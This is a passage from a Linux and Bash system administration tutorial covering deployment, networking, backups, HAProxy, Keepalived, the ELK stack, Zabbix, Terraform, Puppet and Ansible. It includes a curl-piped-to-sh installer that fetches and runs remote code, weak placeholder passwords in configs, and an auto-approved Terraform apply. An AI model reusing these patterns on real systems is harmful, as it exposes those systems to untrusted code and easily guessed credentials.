    PROJECT_DIR="/var/www/project"
    GIT_REPO="https://github.com/user/repo.git"
    APP_SERVICE="app.service"
    
    echo "Starting deployment..."

    # Pull latest changes from git
    cd $PROJECT_DIR
    git pull $GIT_REPO

    # Install dependencies
    composer install
    
    # Run database migrations
    php artisan migrate
    
    # Restart application service
    sudo systemctl restart $APP_SERVICE

    echo "Deployment completed."
    ```

### 5. Advanced Networking Techniques:

- **Network Namespaces for Isolation:**
  - **Creating Network Namespaces:**
    ```bash
    sudo ip netns add mynamespace
    sudo ip netns list  # List namespaces
    ```
  - **Assigning Interfaces to Namespaces:**
    ```bash
    sudo ip link add veth0 type veth peer name veth1
    sudo ip link set veth1 netns mynamespace
    sudo ip netns exec mynamespace ip link set dev veth1 up
    sudo ip link set dev veth0 up
    ```

- **Deep Packet Inspection with Suricata:**
  - **Install Suricata:**
    ```bash
    sudo apt-get install suricata
    ```
  - **Configure Suricata:**
    ```bash
    sudo nano /etc/suricata/suricata.yaml
    
    # Customize running mode and network interfaces
    ids:
      - interface: eth0
    ```
  - **Running Suricata:**
    ```bash
    sudo suricata -c /etc/suricata/suricata.yaml -i eth0
    ```

### 6. Advanced Backup and Disaster Recovery:

- **Incremental Backups with `rsnapshot` and `rsync`:**
  - **Basic `rsync` Command for Backup:**
    ```bash
    rsync -a --delete /source/ /backup/
    ```
  - **Using Snapshot Mechanism with `rsnapshot`:**
    ```bash
    sudo apt-get install rsnapshot
    
    # Example configuration
    sudo nano /etc/rsnapshot.conf
    
    snapshot_root   /var/backups/
    interval        hourly  6
    interval        daily   7
    interval        weekly  4
    
    backup  /home/  localhost/
    
    # Running the snapshot
    sudo rsnapshot hourly
    ```

- **Database Backup and Restoration:**
  - **Backing Up a PostgreSQL Database:**
    ```bash
    pg_dump -U username -F c database_name > backup_file.dump
    ```
  - **Restoring a PostgreSQL Database:**
    ```bash
    pg_restore -U username -d database_name backup_file.dump
    ```

### 7. Customizing and Optimizing Your Bash Environment:

- **Configuring `.bashrc` with Powerline:**
  - **Install Powerline:**
    ```bash
    sudo apt-get install powerline
    sudo pip install powerline-status
    ```
  - **Edit `.bashrc`:**
    ```bash
    echo "if [ -f $(which powerline-daemon) ]; then" >> ~/.bashrc
    echo "  powerline-daemon -q" >> ~/.bashrc
    echo "  POWERLINE_BASH_CONTINUATION=1" >> ~/.bashrc
    echo "  POWERLINE_BASH_SELECT=1" >> ~/.bashrc
    echo "  . /usr/share/powerline/bindings/bash/powerline.sh" >> ~/.bashrc
    echo "fi" >> ~/.bashrc
    ```

- **Using `zsh` with `oh-my-zsh` for an Enhanced Shell Experience:**
  - **Install `zsh`:**
    ```bash
    sudo apt-get install zsh
    chsh -s $(which zsh)
    ```
  - **Install `oh-my-zsh`:**
    ```bash
    sh -c "$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)"
    ```

### 8. Example Advanced Script to Combine All Concepts Learned:
Here’s a comprehensive script that combines advanced scripting techniques, user management, monitoring, and networking.

```bash
#!/bin/bash
# Advanced system setup and monitoring script

# Setup variables
BACKUP_DIR="/var/backups"
LOG_FILE="/var/log/system_setup.log"
NETWORK_NAMESPACE="monitor_ns"
RESOURCE_LIMIT="204800"

# Function to log messages
log_message() {
  echo "$(date +'%Y-%m-%d %H:%M:%S') - $1" >> $LOG_FILE
}

set -e
trap 'log_message "Error occurred at line $LINENO"; exit 1' ERR

log_message "Starting system setup..."

# Create backup directory
mkdir -p $BACKUP_DIR
log_message "Backup directory created at $BACKUP_DIR"

# Configure resource limits
echo "* hard nofile 1024" | sudo tee -a /etc/security/limits.conf
echo "* soft memlock $RESOURCE_LIMIT" | sudo tee -a /etc/security/limits.conf
log_message "Resource limits configured"

# Configure network namespace
sudo ip netns add $NETWORK_NAMESPACE
sudo ip link add veth0 type veth peer name veth1
sudo ip link set veth1 netns $NETWORK_NAMESPACE
sudo ip netns exec $NETWORK_NAMESPACE ip link set dev veth1 up
sudo ip link set dev veth0 up
log_message "Network namespace $NETWORK_NAMESPACE configured"

# Set up advanced monitoring tools
sudo apt-get install -y glances dstat
log_message "Monitoring tools installed"

# Configure user and group privileges
sudo groupadd developers
sudo usermod -aG developers $(whoami)
log_message "User and group privileges configured"

# Create system backup
sudo rsnapshot hourly
log_message "System backup created"

log_message "System setup and monitoring complete."
```


# Chapter 7: Specialized Topics in Bash and Linux

---

### 1. Advanced File Handling and Manipulation:

- **Sparse Files:**
  - **Creating Sparse Files:**
    ```bash
    dd if=/dev/zero of=sparse-file bs=1M count=0 seek=1000  # Create a 1GB sparse file
    ```
  - **Inspecting Files for Sparseness:**
    ```bash
    du -h --apparent-size sparse-file  # Show apparent vs actual disk usage
    ```

- **File Locks with `flock`:**
  - **Locking a File:**
    ```bash
    (
      flock -e 200
      # Critical section
      echo "Locked" > locked-file
    ) 200>locked-file
    ```
  - **Using `flock` in Scripts:**
    ```bash
    #!/bin/bash
    exec 200>/var/lock/mylockfile
    flock -n 200 || exit 1
    echo "Running critical section"
    ```

- **Inotify for Real-Time File Monitoring:**
  - **Install Inotify Tools:**
    ```bash
    sudo apt-get install inotify-tools
    ```
  - **Using `inotifywait` for Real-Time Monitoring:**
    ```bash
    inotifywait -m /path/to/directory -e create -e delete -e modify
    ```

### 2. Advanced Networking with High Availability:

- **Load Balancing with HAProxy:**
  - **Install HAProxy:**
    ```bash
    sudo apt-get install haproxy
    ```
  - **Configure HAProxy:**
    ```bash
    sudo nano /etc/haproxy/haproxy.cfg
    
    global
      log /dev/log local0
      log /dev/log local1 notice
      chroot /var/lib/haproxy
      stats socket /run/haproxy/admin.sock mode 660 level admin
      stats timeout 30s
      user haproxy
      group haproxy
      daemon
    
    defaults
      log global
      mode http
      option httplog
      option dontlognull
      timeout connect 5000
      timeout client  50000
      timeout server  50000
    
    frontend http-in
      bind *:80
      default_backend servers
    
    backend servers
      balance roundrobin
      server server1 192.168.1.2:80 check
      server server2 192.168.1.3:80 check
    ```
  - **Restart HAProxy Service:**
    ```bash
    sudo systemctl restart haproxy
    ```

- **High Availability with Keepalived:**
  - **Install Keepalived:**
    ```bash
    sudo apt-get install keepalived
    ```
  - **Configure Keepalived:**
    ```bash
    sudo nano /etc/keepalived/keepalived.conf
    
    vrrp_instance VI_1 {
      state MASTER
      interface eth0
      virtual_router_id 51
      priority 100
      advert_int 1
      authentication {
        auth_type PASS
        auth_pass 1111
      }
      virtual_ipaddress {
        192.168.1.100
      }
    }
    ```
  - **Start Keepalived Service:**
    ```bash
    sudo systemctl start keepalived
    ```

### 3. In-Depth Logging and Monitoring:

- **Centralized Logging with ELK Stack (Elasticsearch, Logstash, and Kibana):**
  - **Install Elasticsearch:**
    ```bash
    wget -qO - https://artifacts.elastic.co/GPG-KEY-elasticsearch | sudo apt-key add -
    sudo apt-get install apt-transport-https
    echo "deb https://artifacts.elastic.co/packages/7.x/apt stable main" | sudo tee -a /etc/apt/sources.list.d/elastic-7.x.list
    sudo apt-get update
    sudo apt-get install elasticsearch
    sudo systemctl enable elasticsearch
    sudo systemctl start elasticsearch
    ```
  - **Install Logstash:**
    ```bash
    sudo apt-get install logstash
    sudo systemctl enable logstash
    sudo systemctl start logstash
    ```
  - **Install Kibana:**
    ```bash
    sudo apt-get install kibana
    sudo systemctl enable kibana
    sudo systemctl start kibana
    ```
  - **Configure Logstash to Read Logs and Send to Elasticsearch:**
    ```bash
    sudo nano /etc/logstash/conf.d/logstash.conf
    
    input {
      file {
        path => "/var/log/syslog"
        start_position => "beginning"
      }
    }
    
    output {
      elasticsearch {
        hosts => ["localhost:9200"]
        index => "syslog-%{+YYYY.MM.dd}"
      }
    }
    ```
  - **Access Kibana Web Interface:**
    - Open a web browser and go to `http://localhost:5601`.

- **Real-Time System Monitoring with Zabbix:**
  - **Install Zabbix Server and Agent:**
    ```bash
    wget https://repo.zabbix.com/zabbix/5.0/ubuntu/pool/main/z/zabbix-release/zabbix-release_5.0-1%2Bubuntu20.04_all.deb
    sudo dpkg -i zabbix-release_5.0-1+ubuntu20.04_all.deb
    sudo apt-get update
    sudo apt-get install zabbix-server-mysql zabbix-agent zabbix-frontend-php zabbix-apache-conf
    ```
  - **Configure Database for Zabbix:**
    ```bash
    sudo mysql -uroot -p
    
    create database zabbix character set utf8 collate utf8_bin;
    create user zabbix@localhost identified by 'password';
    grant all privileges on zabbix.* to zabbix@localhost;
    quit;
    
    sudo zcat /usr/share/doc/zabbix-server-mysql*/create.sql.gz | mysql -uzabbix -p zabbix
    ```
  - **Configure Zabbix Server:**
    ```bash
    sudo nano /etc/zabbix/zabbix_server.conf
    
    # Update the following parameters:
    DBHost=localhost
    DBName=zabbix
    DBUser=zabbix
    DBPassword=password
    ```
  - **Start Zabbix Server and Agent:**
    ```bash
    sudo systemctl enable zabbix-server zabbix-agent apache2
    sudo systemctl start zabbix-server zabbix-agent apache2
    ```

### 4. Leveraging Modern DevOps Tools:

- **Infrastructure as Code with Terraform:**
  - **Install Terraform:**
    ```bash
    sudo apt-get install unzip
    wget https://releases.hashicorp.com/terraform/0.14.7/terraform_0.14.7_linux_amd64.zip
    unzip terraform_0.14.7_linux_amd64.zip
    sudo mv terraform /usr/local/bin/
    ```
  - **Create a Basic Terraform Configuration:**
    ```hcl
    # main.tf

    provider "aws" {
      region = "us-west-2"
    }

    resource "aws_instance" "example" {
      ami           = "ami-0c55b159cbfafe1f0"
      instance_type = "t2.micro"
    }
    ```
  - **Initialize and Apply Terraform Configuration:**
    ```bash
    terraform init
    terraform apply
    ```

- **Configuration Management with Puppet:**
  - **Install Puppet:**
    ```bash
    sudo apt-get install puppet-agent
    sudo /opt/puppetlabs/bin/puppet resource service puppet ensure=running enable=true
    ```
  - **Basic Puppet Manifest:**
    ```puppet
    # site.pp

    node default {
      package { 'ntp':
        ensure => installed,
      }

      service { 'ntp':
        ensure => running,
        enable => true,
      }

      file { '/etc/ntp.conf':
        ensure  => file,
        content => "server ntp.example.com\n",
      }
    }
    ```
  - **Apply the Manifest:**
    ```bash
    sudo /opt/puppetlabs/bin/puppet apply site.pp
    ```

### 5. Example Script with Advanced DevOps Tools:
Here is a comprehensive script utilizing ansible for advanced configuration management, integrating infrastructure as code with terraform, and centralized logging with the ELK Stack.

```bash
#!/bin/bash
# DevOps automation script using Ansible, Terraform, and ELK Stack

LOG_FILE="/var/log/devops_automation.log"

# Function to log messages
log_message() {
  echo "$(date +'%Y-%m-%d %H:%M:%S') - $1" >> $LOG_FILE
}

# Initialize and apply Terraform configuration
log_message "Initializing and applying Terraform configuration..."
cd /path/to/terraform/config
terraform init && terraform apply -auto-approve
log_message "Terraform configuration applied successfully."

# Set up Ansible roles and playbooks
log_message "Setting up Ansible roles and playbooks..."
cd /path/to/ansible/playbook
ansible-galaxy install geerlingguy.elasticsearch geerlingguy.logstash geerlingguy.kibana
ansible-playbook setup_elk.yml
log_message "Ansible playbook executed successfully."

# Configure Logstash to read application logs
log_message "Configuring Logstash for application logs..."
sudo cp /path/to/logstash/config/app_logs.conf /etc/logstash/conf.d/
sudo systemctl restart logstash
log_message "Logstash configured successfully for application logs."

echo "DevOps automation complete. Check logs for details: $LOG_FILE"
```

Example `ansible` playbook `setup_elk.yml`:
```yaml
---
- hosts: localhost
  become: yes
  roles:
    - geerlingguy.elasticsearch
    - geerlingguy.logstash
    - geerlingguy.kibana

  tasks:
    - name: Ensure Elasticsearch service is running
      service:
        name: elasticsearch
        state: started
        enabled: yes

    - name: Ensure Logstash service is running
      service:
        name: logstash
        state: started
        enabled: yes

    - name: Ensure Kibana service is running
      service:
        name: kibana
        state: started
        enabled: yes
```

Terraform Configuration (`main.tf`):

```hcl
provider "aws" {
  region = "us-west-2"
}

resource "aws_instance" "web" {
  ami           = "ami-0c55b159cbfafe1f0"
  instance_type = "t2.micro"

  tags = {
    Name = "WebServerInstance"
  }
}
```

Logstash Configuration (`app_logs.conf`):

```bash
input {
  file {
    path => "/var/log/application/*.log"
    start_position => "beginning"
  }
}

filter {
  grok {
    match => { "message" => "%{COMBINEDAPACHELOG}" }
  }
  date {
    match => [ "timestamp" , "dd/MMM/yyyy:HH:mm:ss Z" ]
  }
}

output {
  elasticsearch {
    hosts => ["localhost:9200"]
    index => "application-logs-%{+YYYY.MM.dd}"
  }
  stdout { codec => rubydebug }
}
```

---

